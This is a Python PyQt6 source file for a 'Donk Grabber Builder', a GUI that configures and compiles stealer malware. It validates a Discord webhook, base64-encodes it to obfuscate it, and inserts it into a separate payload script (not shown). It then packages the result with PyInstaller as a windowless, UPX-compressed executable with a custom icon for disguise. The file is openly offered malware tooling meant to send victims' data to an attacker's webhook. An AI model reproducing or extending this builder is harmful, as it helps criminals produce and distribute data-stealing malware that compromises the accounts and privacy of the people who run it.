import sys, shutil, re, subprocess
from pathlib import Path
from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QMessageBox, 
                             QFileDialog, QGroupBox)
from PyQt6.QtCore import Qt
import base64

SOURCE = Path('source.py')
DEST   = Path('build.py')

class SimpleWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Donk Grabber Builder')
        self.setFixedSize(500, 300)

        layout = QVBoxLayout()

        # Webhook section
        webhook_group = QGroupBox("Webhook Configuration")
        webhook_layout = QVBoxLayout()
        webhook_layout.addWidget(QLabel('Enter your webhook below:'))
        self.webhook_edit = QLineEdit()
        self.webhook_edit.setPlaceholderText('https://discord.com/api/webhooks/...')
        webhook_layout.addWidget(self.webhook_edit)
        webhook_group.setLayout(webhook_layout)
        layout.addWidget(webhook_group)

        # Build options section
        build_group = QGroupBox("Build Options")
        build_layout = QVBoxLayout()

        # Output name
        name_layout = QHBoxLayout()
        name_layout.addWidget(QLabel('Output Name:'))
        self.name_edit = QLineEdit()
        self.name_edit.setPlaceholderText('myapp (without .exe)')
        self.name_edit.setText('application')
        name_layout.addWidget(self.name_edit)
        build_layout.addLayout(name_layout)

        # Icon selection
        icon_layout = QHBoxLayout()
        icon_layout.addWidget(QLabel('Icon:'))
        self.icon_edit = QLineEdit()
        self.icon_edit.setPlaceholderText('No icon selected')
        self.icon_edit.setReadOnly(True)
        icon_layout.addWidget(self.icon_edit)
        self.icon_btn = QPushButton('Browse...')
        self.icon_btn.clicked.connect(self.select_icon)
        icon_layout.addWidget(self.icon_btn)
        build_layout.addLayout(icon_layout)

        # Icon warning
        icon_warning = QLabel('Please upload .ico files only')
        icon_warning.setStyleSheet('color: #888; font-size: 10px;')
        icon_warning.setAlignment(Qt.AlignmentFlag.AlignRight)
        build_layout.addWidget(icon_warning)

        build_group.setLayout(build_layout)
        layout.addWidget(build_group)

        # Build button
        build_btn = QPushButton('Build Executable')
        build_btn.clicked.connect(self.build)
        build_btn.setStyleSheet('QPushButton { background-color: #7289da; color: white; font-weight: bold; padding: 8px; }')
        layout.addWidget(build_btn)

        self.setLayout(layout)

    def select_icon(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, 
            'Select Icon File', 
            '', 
            'Icon Files (*.ico)'
        )
        if file_path:
            self.icon_edit.setText(file_path)

    def alert(self, text):
        QMessageBox.critical(self, 'Error', text)

    def info(self, text):
        QMessageBox.information(self, 'Information', text)

    def validate_webhook(self, url: str) -> bool:
        return re.fullmatch(r'https?://discord(?:app)?\.com/api/webhooks/\d+/[\w-]+', url.strip()) is not None

    def build(self):
        webhook = self.webhook_edit.text().strip()
        output_name = self.name_edit.text().strip()
        icon_path = self.icon_edit.text().strip()

        if not webhook:
            self.alert('Webhook cannot be empty.')
            return

        if not self.validate_webhook(webhook):
            self.alert('Invalid Discord webhook URL.')
            return

        if not output_name:
            self.alert('Output name cannot be empty.')
            return

        if icon_path and not icon_path.endswith('.ico'):
            self.alert('Please select a valid .ico file for the icon.')
            return

        # Validate icon file exists if provided
        if icon_path and not Path(icon_path).exists():
            self.alert('Selected icon file does not exist.')
            return

        try:
            shutil.copy(SOURCE, DEST)
        except FileNotFoundError:
            self.alert(f'Source file {SOURCE} not found.')
            return

        try:
            # Encode webhook in base64 for obfuscation
            encoded_webhook = base64.b64encode(webhook.encode()).decode()
            code = DEST.read_text(encoding='utf-8')
            code = code.replace('WEBHOOK_PLACEHOLDER', encoded_webhook)
            DEST.write_text(code, encoding='utf-8')
        except Exception as e:
            self.alert(f'Could not patch build.py:\n{e}')
            return

        try:
            # Build PyInstaller command with UPX compression
            pyinstaller_cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                '--clean',
                '--upx-dir=./donk_upx',
                '--name', output_name,
            ]

            # Add icon if provided
            if icon_path:
                pyinstaller_cmd.extend(['--icon', icon_path])

            # Add final options
            pyinstaller_cmd.extend([
                '--distpath', 'dist',
                '--workpath', 'build',
                '--specpath', '.',
                '--noconfirm',
                'build.py'
            ])

            # Run PyInstaller
            result = subprocess.run(
                pyinstaller_cmd,
                capture_output=True,
                text=True,
                timeout=120
            )

            if result.returncode == 0:
                self.info(f'Executable created successfully in dist/ folder!\n\nFile: {output_name}.exe\nSize: Reduced with UPX compression')
            else:
                self.alert(f'PyInstaller failed:\n{result.stderr}')

        except subprocess.TimeoutExpired:
            self.alert('Build process timed out after 2 minutes.')
        except subprocess.CalledProcessError as e:
            self.alert(f'PyInstaller failed:\n{e}')
        except Exception as e:
            self.alert(f'Unexpected error during build:\n{e}')
        finally:
            # Clean up build.py
            if DEST.exists():
                try:
                    DEST.unlink()
                except:
                    pass

if __name__ == '__main__':
    app = QApplication(sys.argv)
    w = SimpleWindow()
    w.show()
    sys.exit(app.exec())